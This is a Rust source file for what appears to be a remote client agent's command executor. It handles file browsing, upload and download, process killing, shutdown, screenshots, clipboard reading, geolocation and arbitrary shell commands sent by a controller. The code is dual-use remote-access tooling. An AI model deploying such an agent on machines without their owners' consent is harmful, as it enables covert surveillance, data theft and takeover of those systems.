use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::Mutex;

use crate::terminal::commands::Command;
use crate::terminal::protocol::ClientResponse;
use crate::terminal::client_agent::handlers;

/// Executor state holds the current working directory for the session.
pub struct ExecutorState {
    pub cwd: PathBuf,
}

impl ExecutorState {
    pub fn new() -> Self {
        Self {
            cwd: std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
        }
    }
}

/// Execute a command and return a ClientResponse.
/// This function never panics — all errors are caught and returned as failed responses.
pub async fn execute(
    id: u64,
    command: Command,
    client_id: &str,
    tag: &str,
    state: &Arc<Mutex<ExecutorState>>,
) -> ClientResponse {
    let result = execute_inner(command, state).await;

    match result {
        Ok(output) => ClientResponse {
            id,
            client_id: client_id.to_string(),
            tag: tag.to_string(),
            output,
            success: true,
        },
        Err(error) => ClientResponse {
            id,
            client_id: client_id.to_string(),
            tag: tag.to_string(),
            output: error,
            success: false,
        },
    }
}

async fn execute_inner(
    command: Command,
    state: &Arc<Mutex<ExecutorState>>,
) -> Result<String, String> {
    match command {
        Command::Ls { path } => {
            let st = state.lock().await;
            handlers::files::handle_ls(path.as_deref(), &st.cwd)
        }

        Command::Pwd => {
            let st = state.lock().await;
            handlers::files::handle_pwd(&st.cwd)
        }

        Command::Cd { path } => {
            let mut st = state.lock().await;
            let new_cwd = handlers::files::handle_cd(&path, &st.cwd)?;
            let display = new_cwd.display().to_string();
            st.cwd = new_cwd;
            Ok(display)
        }

        Command::Cat { path } => {
            let st = state.lock().await;
            handlers::files::handle_cat(&path, &st.cwd)
        }

        Command::Whoami => handlers::sysinfo::handle_whoami(),

        Command::Sysinfo => handlers::sysinfo::handle_sysinfo(),

        Command::Processes => handlers::processes::handle_processes(),

        Command::Kill { pid } => handlers::processes::handle_kill(pid),

        Command::DiskInfo => handlers::disk::handle_disk_info(),

        Command::Lock => handlers::power::handle_lock(),

        Command::Shutdown => handlers::power::handle_shutdown(),

        Command::Restart => handlers::power::handle_restart(),

        Command::Notify { message } => handlers::notify::handle_notify(&message),

        Command::Alert => handlers::notify::handle_alert(),

        Command::Locate => handlers::locate::handle_locate().await,

        Command::NetInfo => handlers::network::handle_netinfo(),

        Command::Users => handlers::users::handle_users(),

        Command::Screenshot => handlers::screen::handle_screenshot(),

        Command::Clipboard => handlers::clipboard::handle_clipboard(),

        Command::Battery => handlers::battery::handle_battery(),

        Command::Upload { filename, data } => {
            let st = state.lock().await;
            handlers::transfer::handle_upload(&filename, &data, &st.cwd)
        }

        Command::Download { path } => {
            let st = state.lock().await;
            let (filename, data) = handlers::transfer::handle_download(&path, &st.cwd)?;
            let encoded = base64_encode(&data);
            Ok(format!("FILE_TRANSFER:{}:{}", filename, encoded))
        }

        Command::Ping => Ok("PONG".to_string()),

        Command::Shell { command } => handle_shell(&command),
    }
}

fn handle_shell(command: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    let output = std::process::Command::new("cmd")
        .args(["/C", command])
        .output();

    #[cfg(not(target_os = "windows"))]
    let output = std::process::Command::new("sh")
        .args(["-c", command])
        .output();

    match output {
        Ok(o) => {
            let stdout = String::from_utf8_lossy(&o.stdout).to_string();
            let stderr = String::from_utf8_lossy(&o.stderr).to_string();

            let mut result = String::new();
            if !stdout.is_empty() {
                result.push_str(&stdout);
            }
            if !stderr.is_empty() {
                if !result.is_empty() {
                    result.push('\n');
                }
                result.push_str("[stderr] ");
                result.push_str(&stderr);
            }
            if result.is_empty() {
                result = "(no output)".to_string();
            }

            if o.status.success() {
                Ok(result)
            } else {
                Err(format!(
                    "Exit code {}: {}",
                    o.status.code().unwrap_or(-1),
                    result
                ))
            }
        }
        Err(e) => Err(format!("Failed to execute shell command: {}", e)),
    }
}

fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    let mut i = 0;

    while i < data.len() {
        let b0 = data[i] as u32;
        let b1 = if i + 1 < data.len() {
            data[i + 1] as u32
        } else {
            0
        };
        let b2 = if i + 2 < data.len() {
            data[i + 2] as u32
        } else {
            0
        };

        let triple = (b0 << 16) | (b1 << 8) | b2;

        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);

        if i + 1 < data.len() {
            result.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }

        if i + 2 < data.len() {
            result.push(CHARS[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }

        i += 3;
    }

    result
}
